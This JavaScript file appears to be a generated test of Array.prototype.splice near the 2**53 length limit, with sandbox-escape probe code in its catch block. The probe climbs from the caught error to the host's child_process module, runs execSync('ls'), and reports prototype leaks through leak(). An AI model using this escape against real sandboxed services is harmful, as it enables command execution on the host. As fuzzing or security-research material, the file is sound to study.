try {
    var arrayLike = {
        '9007199254740985': '9007199254740985',
        '9007199254740986': '9007199254740986',
        '9007199254740987': '9007199254740987',
        '9007199254740989': '9007199254740989',
        '9007199254740991': '9007199254740991',
        length: 2 ** 53 - 2
    };
    var result = Array.prototype.splice.call(arrayLike, 9007199254740986, 0, 'new-value');
    assert.compareArray(result, [], 'No elements are removed');
    assert.sameValue(arrayLike.length, 2 ** 53 - 1, 'New length is 2**53 - 1');
    assert.sameValue(arrayLike['9007199254740985'], '9007199254740985', 'arrayLike[\'9007199254740985\'] is unchanged');
    assert.sameValue(arrayLike['9007199254740986'], 'new-value', 'arrayLike[\'9007199254740986\'] contains the inserted value');
    assert.sameValue(arrayLike['9007199254740987'], '9007199254740986', 'arrayLike[\'9007199254740986\'] is moved to arrayLike[\'9007199254740987\']');
    assert.sameValue(arrayLike['9007199254740988'], '9007199254740987', 'arrayLike[\'9007199254740987\'] is moved to arrayLike[\'9007199254740988\']');
    assert.sameValue('9007199254740989' in arrayLike, false, 'arrayLike[\'9007199254740989\'] is removed');
    assert.sameValue(arrayLike['9007199254740990'], '9007199254740989', 'arrayLike[\'9007199254740989\'] is moved to arrayLike[\'9007199254740990\']');
    assert.sameValue(arrayLike['9007199254740991'], '9007199254740991', 'arrayLike[\'9007199254740991\'] is unchanged');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}